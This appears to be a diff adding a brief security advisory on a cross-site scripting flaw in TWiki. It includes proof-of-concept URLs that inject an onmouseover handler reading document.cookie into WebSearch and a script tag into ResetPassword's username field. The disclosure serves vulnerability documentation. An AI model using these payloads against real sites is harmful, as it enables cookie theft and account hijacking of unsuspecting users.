@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/32669/info
+
+TWiki is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+An HTML form field must exist containing an input value with specifying an encoding. As an example:
+
+<input type="text" name="city" value="%URLPARAM{ "city" }%" />
+
+THe following examples will then demonstrate this issue:
+
+http://example.com/twiki/view/TWiki/WebSearch?search=%27a%20onmouseover=alert(document.cookie)%20%27
+
+http://example.com/twiki/view/TWiki/ResetPassword?username="<script language=Javascript>alert('3y3 0wn j00 TWIKI')</script>
